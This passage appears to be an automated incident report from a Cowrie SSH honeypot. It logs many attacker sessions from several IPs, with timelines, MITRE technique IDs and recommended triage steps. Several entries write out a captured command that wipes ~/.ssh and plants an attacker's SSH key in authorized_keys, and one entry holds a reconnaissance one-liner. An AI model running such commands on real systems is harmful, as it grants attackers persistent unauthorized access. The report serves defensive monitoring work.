| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:01:32` | `cowrie.session.connect` |
| `2026-07-05 08:01:32` | `cowrie.client.version` |
| `2026-07-05 08:01:32` | `cowrie.client.kex` |
| `2026-07-05 08:01:33` | `cowrie.login.success` |
| `2026-07-05 08:01:34` | `cowrie.session.params` |
| `2026-07-05 08:01:34` | `cowrie.command.input` |
| `2026-07-05 08:01:34` | `cowrie.command.failed` |
| `2026-07-05 08:01:34` | `cowrie.log.closed` |
| `2026-07-05 08:01:35` | `cowrie.session.params` |
| `2026-07-05 08:01:35` | `cowrie.command.input` |
| `2026-07-05 08:01:35` | `cowrie.session.file_download` |
| `2026-07-05 08:01:35` | `cowrie.log.closed` |
| `2026-07-05 08:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bde205e30c5

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-07-05 08:01 |
| **Last Seen** | 2026-07-05 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:01:36` | `cowrie.session.connect` |
| `2026-07-05 08:01:36` | `cowrie.client.version` |
| `2026-07-05 08:01:36` | `cowrie.client.kex` |
| `2026-07-05 08:01:37` | `cowrie.login.success` |
| `2026-07-05 08:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddbbf53974e7

| Field | Detail |
|---|---|
| **Source IP** | `34.175.118[.]185` |
| **First Seen** | 2026-07-05 08:01 |
| **Last Seen** | 2026-07-05 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:01:37` | `cowrie.session.connect` |
| `2026-07-05 08:01:37` | `cowrie.client.version` |
| `2026-07-05 08:01:38` | `cowrie.client.kex` |
| `2026-07-05 08:01:39` | `cowrie.login.success` |
| `2026-07-05 08:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.175.118[.]185` to AbuseIPDB if not already reported
- [ ] Block `34.175.118[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ba444a722d

| Field | Detail |
|---|---|
| **Source IP** | `211.46.188[.]16` |
| **First Seen** | 2026-07-05 08:02 |
| **Last Seen** | 2026-07-05 08:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:02:10` | `cowrie.session.connect` |
| `2026-07-05 08:02:10` | `cowrie.client.version` |
| `2026-07-05 08:02:10` | `cowrie.client.kex` |
| `2026-07-05 08:02:11` | `cowrie.login.success` |
| `2026-07-05 08:02:12` | `cowrie.session.params` |
| `2026-07-05 08:02:12` | `cowrie.command.input` |
| `2026-07-05 08:02:12` | `cowrie.command.failed` |
| `2026-07-05 08:02:13` | `cowrie.log.closed` |
| `2026-07-05 08:02:13` | `cowrie.session.params` |
| `2026-07-05 08:02:13` | `cowrie.command.input` |
| `2026-07-05 08:02:14` | `cowrie.session.file_download` |
| `2026-07-05 08:02:14` | `cowrie.log.closed` |
| `2026-07-05 08:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.188[.]16` to AbuseIPDB if not already reported
- [ ] Block `211.46.188[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee16761870c

| Field | Detail |
|---|---|
| **Source IP** | `211.46.188[.]16` |
| **First Seen** | 2026-07-05 08:02 |
| **Last Seen** | 2026-07-05 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:02:14` | `cowrie.session.connect` |
| `2026-07-05 08:02:14` | `cowrie.client.version` |
| `2026-07-05 08:02:14` | `cowrie.client.kex` |
| `2026-07-05 08:02:15` | `cowrie.login.success` |
| `2026-07-05 08:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.188[.]16` to AbuseIPDB if not already reported
- [ ] Block `211.46.188[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d06d6580168

| Field | Detail |
|---|---|
| **Source IP** | `211.46.188[.]16` |
| **First Seen** | 2026-07-05 08:02 |
| **Last Seen** | 2026-07-05 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:02:15` | `cowrie.session.connect` |
| `2026-07-05 08:02:15` | `cowrie.client.version` |
| `2026-07-05 08:02:15` | `cowrie.client.kex` |
| `2026-07-05 08:02:16` | `cowrie.login.success` |
| `2026-07-05 08:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.188[.]16` to AbuseIPDB if not already reported
- [ ] Block `211.46.188[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb44727cd96b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 08:04 |
| **Last Seen** | 2026-07-05 08:04 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:04:02` | `cowrie.session.connect` |
| `2026-07-05 08:04:03` | `cowrie.client.version` |
| `2026-07-05 08:04:03` | `cowrie.client.kex` |
| `2026-07-05 08:04:10` | `cowrie.login.success` |
| `2026-07-05 08:04:13` | `cowrie.session.params` |
| `2026-07-05 08:04:13` | `cowrie.command.input` |
| `2026-07-05 08:04:14` | `cowrie.log.closed` |
| `2026-07-05 08:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b441e7e256

| Field | Detail |
|---|---|
| **Source IP** | `2.26.109[.]172` |
| **First Seen** | 2026-07-05 08:07 |
| **Last Seen** | 2026-07-05 08:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:07:57` | `cowrie.session.connect` |
| `2026-07-05 08:07:57` | `cowrie.client.version` |
| `2026-07-05 08:07:57` | `cowrie.client.kex` |
| `2026-07-05 08:07:58` | `cowrie.login.success` |
| `2026-07-05 08:07:58` | `cowrie.session.params` |
| `2026-07-05 08:07:58` | `cowrie.command.input` |
| `2026-07-05 08:07:58` | `cowrie.command.failed` |
| `2026-07-05 08:07:59` | `cowrie.log.closed` |
| `2026-07-05 08:07:59` | `cowrie.session.params` |
| `2026-07-05 08:07:59` | `cowrie.command.input` |
| `2026-07-05 08:07:59` | `cowrie.session.file_download` |
| `2026-07-05 08:07:59` | `cowrie.log.closed` |
| `2026-07-05 08:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.109[.]172` to AbuseIPDB if not already reported
- [ ] Block `2.26.109[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ef485b8bbb

| Field | Detail |
|---|---|
| **Source IP** | `2.26.109[.]172` |
| **First Seen** | 2026-07-05 08:08 |
| **Last Seen** | 2026-07-05 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:08:00` | `cowrie.session.connect` |
| `2026-07-05 08:08:00` | `cowrie.client.version` |
| `2026-07-05 08:08:00` | `cowrie.client.kex` |
| `2026-07-05 08:08:00` | `cowrie.login.success` |
| `2026-07-05 08:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.109[.]172` to AbuseIPDB if not already reported
- [ ] Block `2.26.109[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31b94cc18afc

| Field | Detail |
|---|---|
| **Source IP** | `2.26.109[.]172` |
| **First Seen** | 2026-07-05 08:08 |
| **Last Seen** | 2026-07-05 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:08:00` | `cowrie.session.connect` |
| `2026-07-05 08:08:00` | `cowrie.client.version` |
| `2026-07-05 08:08:00` | `cowrie.client.kex` |
| `2026-07-05 08:08:01` | `cowrie.login.success` |
| `2026-07-05 08:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.109[.]172` to AbuseIPDB if not already reported
- [ ] Block `2.26.109[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6976637f6843

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 08:15 |
| **Last Seen** | 2026-07-05 08:15 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:15:32` | `cowrie.session.connect` |
| `2026-07-05 08:15:33` | `cowrie.client.version` |
| `2026-07-05 08:15:33` | `cowrie.client.kex` |
| `2026-07-05 08:15:40` | `cowrie.login.success` |
| `2026-07-05 08:15:43` | `cowrie.session.params` |
| `2026-07-05 08:15:43` | `cowrie.command.input` |
| `2026-07-05 08:15:45` | `cowrie.log.closed` |
| `2026-07-05 08:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58b265146f35

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 08:22 |
| **Last Seen** | 2026-07-05 08:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:22:47` | `cowrie.session.connect` |
| `2026-07-05 08:22:47` | `cowrie.client.version` |
| `2026-07-05 08:22:48` | `cowrie.client.kex` |
| `2026-07-05 08:22:48` | `cowrie.login.success` |
| `2026-07-05 08:22:48` | `cowrie.direct-tcpip.request` |
| `2026-07-05 08:22:48` | `cowrie.direct-tcpip.data` |
| `2026-07-05 08:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c65f4ae31f9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-05 08:24 |
| **Last Seen** | 2026-07-05 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:24:17` | `cowrie.session.connect` |
| `2026-07-05 08:24:17` | `cowrie.client.version` |
| `2026-07-05 08:24:17` | `cowrie.client.kex` |
| `2026-07-05 08:24:18` | `cowrie.login.success` |
| `2026-07-05 08:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff40278955a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-05 08:24 |
| **Last Seen** | 2026-07-05 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:24:17` | `cowrie.session.connect` |
| `2026-07-05 08:24:17` | `cowrie.client.version` |
| `2026-07-05 08:24:17` | `cowrie.client.kex` |
| `2026-07-05 08:24:18` | `cowrie.login.success` |
| `2026-07-05 08:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327427a728bc

| Field | Detail |
|---|---|
| **Source IP** | `107.173.85[.]94` |
| **First Seen** | 2026-07-05 08:24 |
| **Last Seen** | 2026-07-05 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'empty_test'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:24:31` | `cowrie.session.connect` |
| `2026-07-05 08:24:31` | `cowrie.client.version` |
| `2026-07-05 08:24:31` | `cowrie.client.kex` |
| `2026-07-05 08:24:32` | `cowrie.login.success` |
| `2026-07-05 08:24:32` | `cowrie.session.params` |
| `2026-07-05 08:24:32` | `cowrie.command.input` |
| `2026-07-05 08:24:32` | `cowrie.log.closed` |
| `2026-07-05 08:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.85[.]94` to AbuseIPDB if not already reported
- [ ] Block `107.173.85[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21bd24b28184

| Field | Detail |
|---|---|
| **Source IP** | `107.173.85[.]94` |
| **First Seen** | 2026-07-05 08:24 |
| **Last Seen** | 2026-07-05 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v ls >/dev/null 2>&1 && echo ok || echo missing:ls; echo SEP; command -v ps >/dev/null 2>&1 && echo ok || echo missing:ps; echo SEP; command -v cat >/dev/null 2>&1 && echo ok || echo missing:cat; echo SEP; command -v netstat >/dev/null 2>&1 && echo ok || echo missing:netstat; echo SEP; uname -m 2>/dev/null || echo unknown; echo SEP; cat /etc/os-release 2>/dev/null | grep '^NAME=' | cut -d= -f2 | tr -d '"' || echo Linux; echo SEP; hostname 2>/dev/null || echo unknown; echo SEP; curl -s --connect-tim` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:24:37` | `cowrie.session.connect` |
| `2026-07-05 08:24:37` | `cowrie.client.version` |
| `2026-07-05 08:24:37` | `cowrie.client.kex` |
| `2026-07-05 08:24:37` | `cowrie.login.success` |
| `2026-07-05 08:24:37` | `cowrie.session.params` |
| `2026-07-05 08:24:37` | `cowrie.command.input` |
| `2026-07-05 08:24:37` | `cowrie.command.failed` |
| `2026-07-05 08:24:37` | `cowrie.command.failed` |
| `2026-07-05 08:24:37` | `cowrie.command.failed` |
| `2026-07-05 08:24:37` | `cowrie.command.failed` |
| `2026-07-05 08:24:38` | `cowrie.log.closed` |
| `2026-07-05 08:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.85[.]94` to AbuseIPDB if not already reported
- [ ] Block `107.173.85[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b84d56613b33

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 08:26 |
| **Last Seen** | 2026-07-05 08:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:26:47` | `cowrie.session.connect` |
| `2026-07-05 08:26:49` | `cowrie.client.version` |
| `2026-07-05 08:26:49` | `cowrie.client.kex` |
| `2026-07-05 08:26:54` | `cowrie.login.success` |
| `2026-07-05 08:26:57` | `cowrie.session.params` |
| `2026-07-05 08:26:57` | `cowrie.command.input` |
| `2026-07-05 08:26:59` | `cowrie.log.closed` |
| `2026-07-05 08:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8de68d44711

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 08:30 |
| **Last Seen** | 2026-07-05 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:30:03` | `cowrie.session.connect` |
| `2026-07-05 08:30:03` | `cowrie.client.version` |
| `2026-07-05 08:30:03` | `cowrie.client.kex` |
| `2026-07-05 08:30:04` | `cowrie.login.success` |
| `2026-07-05 08:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69be2fb9ce79

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 08:30 |
| **Last Seen** | 2026-07-05 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:30:05` | `cowrie.session.connect` |
| `2026-07-05 08:30:05` | `cowrie.client.version` |
| `2026-07-05 08:30:05` | `cowrie.client.kex` |
| `2026-07-05 08:30:05` | `cowrie.login.success` |
| `2026-07-05 08:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c9d9e1f4ea5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 08:30 |
| **Last Seen** | 2026-07-05 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:30:05` | `cowrie.session.connect` |
| `2026-07-05 08:30:05` | `cowrie.client.version` |
| `2026-07-05 08:30:05` | `cowrie.client.kex` |
| `2026-07-05 08:30:06` | `cowrie.login.success` |
| `2026-07-05 08:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78fa0200c4ac

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-05 08:30 |
| **Last Seen** | 2026-07-05 08:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:30:06` | `cowrie.session.connect` |
| `2026-07-05 08:30:06` | `cowrie.client.version` |
| `2026-07-05 08:30:06` | `cowrie.client.kex` |
| `2026-07-05 08:30:07` | `cowrie.login.success` |
| `2026-07-05 08:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1989149a2f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 08:38 |
| **Last Seen** | 2026-07-05 08:38 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:38:01` | `cowrie.session.connect` |
| `2026-07-05 08:38:03` | `cowrie.client.version` |
| `2026-07-05 08:38:03` | `cowrie.client.kex` |
| `2026-07-05 08:38:09` | `cowrie.login.success` |
| `2026-07-05 08:38:13` | `cowrie.session.params` |
| `2026-07-05 08:38:13` | `cowrie.command.input` |
| `2026-07-05 08:38:15` | `cowrie.log.closed` |
| `2026-07-05 08:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb9c001d99a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-05 08:42 |
| **Last Seen** | 2026-07-05 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:42:39` | `cowrie.session.connect` |
| `2026-07-05 08:42:39` | `cowrie.client.version` |
| `2026-07-05 08:42:39` | `cowrie.client.kex` |
| `2026-07-05 08:42:39` | `cowrie.login.success` |
| `2026-07-05 08:42:40` | `cowrie.session.params` |
| `2026-07-05 08:42:40` | `cowrie.command.input` |
| `2026-07-05 08:42:40` | `cowrie.log.closed` |
| `2026-07-05 08:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e9a864f73cb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 08:49 |
| **Last Seen** | 2026-07-05 08:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:49:24` | `cowrie.session.connect` |
| `2026-07-05 08:49:25` | `cowrie.client.version` |
| `2026-07-05 08:49:25` | `cowrie.client.kex` |
| `2026-07-05 08:49:31` | `cowrie.login.success` |
| `2026-07-05 08:49:35` | `cowrie.session.params` |
| `2026-07-05 08:49:35` | `cowrie.command.input` |
| `2026-07-05 08:49:37` | `cowrie.log.closed` |
| `2026-07-05 08:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-de5f8827d238

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:55 |
| **Last Seen** | 2026-07-05 06:55 |
| **Session Duration** | 13s |
